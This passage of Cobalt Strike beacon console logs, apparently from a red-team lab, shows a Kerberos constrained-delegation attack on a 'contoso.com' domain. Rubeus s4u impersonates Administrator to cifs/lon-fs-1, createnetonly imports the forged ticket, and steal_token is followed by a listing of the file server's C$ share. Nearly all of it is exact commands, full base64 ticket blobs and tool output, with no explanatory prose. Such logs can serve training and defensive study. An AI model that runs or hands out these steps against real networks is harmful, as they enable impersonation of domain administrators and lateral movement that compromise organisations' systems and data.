0SPpD2X1Ayh3aaeO49qR7Bq6m+AHn8V2/7v1gvF111w3DZPPinzzP1sBpttRsa3sxBDhj0uChN44nIjhLUivA/Yuz7dn7cSbGSCJMHqWVY0WeA/vhxYVDenbl5HlXWxm3OAbUnhODgiMP1HkHCrXbOvX3V7jjP2YHiGtI6fpqYBR6FSfrGHAjfZ5NuHGil09j2kxbM7GdsK8IHew3YktDr94s5MTntVnWRnSfUspsRbp7RvHHMfnhyAZc8yYpUvFnxMdhFRT1URYxur3phfdb1nNnH3L5rSX9m7p/UwrG7tscRf9O95nGY2sYEJVur3Z6Ys89y3AUXS8cUN28V81snjYb7vEEOLHIZfLNucfR//j/TQ0nkqIoaZom8Oi1LkO9rwmjD1WqfssIu+B7r35K5HnS8ONd4RK1dZryCdCf9QFe07jE1RVHbzsZrLg7y46vSRTtFxYKKO4cCdwDzEWMbQp4UeR5qEgexQUP6zDiET9chmdJ7EfMhjHHxIkRLaInR6spNV6p7D0dTS5W4cuXuMgDTlYHDXvnrPE6iXCqTMaMoUUlb8couB6a4bHDgI7h7MfrNjhi9gsztr2n7NDx4oU4xvxmmCQhx5EGGG3TTPZldPuQprPWfgzJU5dvOAj+NLZsis8p0/0ffbVOyIS4CfJmG4es07PIZzH+GX2u8Kquh3wo4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgGzAZoAMCARehEgQQT4IJoqr8n5OgnivuTqLzQKENGwtDT05UT1NPLkNPTaIZMBegAwIBAaEQMA4bDExPTi1XS1NUTi0xJKMHAwUAYKEAAKURGA8yMDI1MTIwODEyNDc0OVqmERgPMjAyNTEyMDgyMjE5MjdapxEYDzIwMjUxMjE1MTIxOTI3WqgNGwtDT05UT1NPLkNPTakgMB6gAwIBAqEXMBUbBmtyYnRndBsLQ09OVE9TTy5DT00=


[12/08 12:47:50] [+] job 0 completed
```

```powershell
[12/08 12:49:01] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:doIFjDCCBYigAwIBBaEDAgEWooIEoDCCBJxhggSYMIIElKADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBFowggRWoAMCARKhAwIBAqKCBEgEggREbsU6+ppNupK/QElA7kDLH/xq9rILKodc3FWBztnSyJgXX58NGIxNMckkPH1wrV6X+ZDoS3MdPZlzFktfA+/j6QjBf+M6aSoKOlV15NZx/CiN+dFK9djYlhg1H9DfTO95f1d0KLNPgMx/3O/WyCI4cBshN/82vwbUW7Ub34yWkcjfMUSFgBZmJcpvcRbY97pjb0FdEv7HajBNLE1fLh7d6wQ5IgPnghHKjaXl+V5x19vWJw5gJA44tHol2JKsK33UrquW5ukEy2d+uLn2Evzxzaislz4s/SdMDlEFK+UIwfLPEqJ5wap0KeYWxHntjfpw8w5HE/EvsLHNLYawTEWKzZo11yE+PjFVi7/Pg/rNOqXFGtTxC3b72dzf8ujMAUxBKWczl+vUpU5kFlOvvvhsw/JbHBW6dNeln1vOhMNBeWzGq/RAQDLvniAtc/K6dm+sOm6hmMbYmFmdnprYzs7hGST5li/D97LhbqNAn/qi/2ThS9A37yMI6ziVE5egGvscilGuyv+WtlH7/YFGJ9aKJy7Sl0jaVD5npDumfGFsewsHIugSB7tEDLkwCdHXMhY7/fmq1CM3jZ7+xsWjjklJPMGdM7suc5nWqpTeF2dWZWKbS9Zm9zZeYjLMC/lFjE0s1pEdSWIqYm0QLdpABIsDYyWawvKXk3kzSwANf27+jjd4KaB5Eq0csn5B78sANRpf+N6AY1Cr1Cz5CubXDjRi3X3EM37d1qJ04vIg4/Dsm56cCGIWarLWX2/JatHq7BWT0SPpD2X1Ayh3aaeO49qR7Bq6m+AHn8V2/7v1gvF111w3DZPPinzzP1sBpttRsa3sxBDhj0uChN44nIjhLUivA/Yuz7dn7cSbGSCJMHqWVY0WeA/vhxYVDenbl5HlXWxm3OAbUnhODgiMP1HkHCrXbOvX3V7jjP2YHiGtI6fpqYBR6FSfrGHAjfZ5NuHGil09j2kxbM7GdsK8IHew3YktDr94s5MTntVnWRnSfUspsRbp7RvHHMfnhyAZc8yYpUvFnxMdhFRT1URYxur3phfdb1nNnH3L5rSX9m7p/UwrG7tscRf9O95nGY2sYEJVur3Z6Ys89y3AUXS8cUN28V81snjYb7vEEOLHIZfLNucfR//j/TQ0nkqIoaZom8Oi1LkO9rwmjD1WqfssIu+B7r35K5HnS8ONd4RK1dZryCdCf9QFe07jE1RVHbzsZrLg7y46vSRTtFxYKKO4cCdwDzEWMbQp4UeR5qEgexQUP6zDiET9chmdJ7EfMhjHHxIkRLaInR6spNV6p7D0dTS5W4cuXuMgDTlYHDXvnrPE6iXCqTMaMoUUlb8couB6a4bHDgI7h7MfrNjhi9gsztr2n7NDx4oU4xvxmmCQhx5EGGG3TTPZldPuQprPWfgzJU5dvOAj+NLZsis8p0/0ffbVOyIS4CfJmG4es07PIZzH+GX2u8Kquh3wo4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgGzAZoAMCARehEgQQT4IJoqr8n5OgnivuTqLzQKENGwtDT05UT1NPLkNPTaIZMBegAwIBAaEQMA4bDExPTi1XS1NUTi0xJKMHAwUAYKEAAKURGA8yMDI1MTIwODEyNDc0OVqmERgPMjAyNTEyMDgyMjE5MjdapxEYDzIwMjUxMjE1MTIxOTI3WqgNGwtDT05UT1NPLkNPTakgMB6gAwIBAqEXMBUbBmtyYnRndBsLQ09OVE9TTy5DT00= /nowrap
[12/08 12:49:07] [+] host called home, sent: 581774 bytes
[12/08 12:49:27] [+] job registered with id 1
[12/08 12:49:27] [+] [job 1] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'LON-WKSTN-1$@CONTOSO.COM'

[12/08 12:49:27] [+] [job 1] received output:
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88

[12/08 12:49:28] [+] [job 1] received output:
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WKSTN-1$@CONTOSO.COM'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/lon-fs-1':

      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

[12/08 12:49:28] [+] job 1 completed
```

```powershell
[12/08 12:50:42] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket: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
[12/08 12:50:48] [+] host called home, sent: 582496 bytes
[12/08 12:51:05] [+] job registered with id 2
[12/08 12:51:05] [+] [job 2] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Create Process (/netonly)


[*] Using CONTOSO.COM\Administrator:FakePass

[*] Showing process : False
[*] Username        : Administrator
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 14896
[+] Ticket successfully imported!
[+] LUID            : 0x11b6dec

[12/08 12:51:06] [+] job 2 completed
```

```powershell
[12/08 12:51:50] beacon> steal_token 14896
[12/08 12:51:50] [+] host called home, sent: 12 bytes
[12/08 12:51:50] [+] Impersonated NT AUTHORITY\SYSTEM
```

```powershell
[12/08 12:52:20] beacon> run klist
[12/08 12:52:20] [+] host called home, sent: 23 bytes
[12/08 12:52:20] [+] job registered with id 3
[12/08 12:52:20] [+] [job 3] received output:

Current LogonId is 0:0x11b6dec

Cached Tickets: (1)

#0>	Client: Administrator @ CONTOSO.COM
	Server: cifs/lon-fs-1 @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	Start Time: 12/8/2025 12:49:27 (local)
	End Time:   12/8/2025 22:19:27 (local)
	Renew Time: 12/15/2025 12:19:27 (local)
	Session Key Type: AES-128-CTS-HMAC-SHA1-96
	Cache Flags: 0 
	Kdc Called: 

[12/08 12:52:20] [+] job 3 completed
```

```powershell
[12/08 12:52:43] beacon> ls \\lon-fs-1\c$
[12/08 12:52:43] [+] host called home, sent: 31 bytes
[12/08 12:52:43] [*] Listing: \\lon-fs-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     02/20/2025 10:37:21   Files
          dir     05/08/2021 09:20:24   PerfLogs
          dir     04/11/2025 13:05:23   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     04/11/2025 11:57:19   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/24/2025 14:18:02   System Volume Information
          dir     01/24/2025 14:17:49   Users
          dir     04/11/2025 11:57:34   Windows
 12kb     fil     12/08/2025 04:18:37   DumpStack.log.tmp
 1gb      fil     12/08/2025 04:18:37   pagefile.sys
```
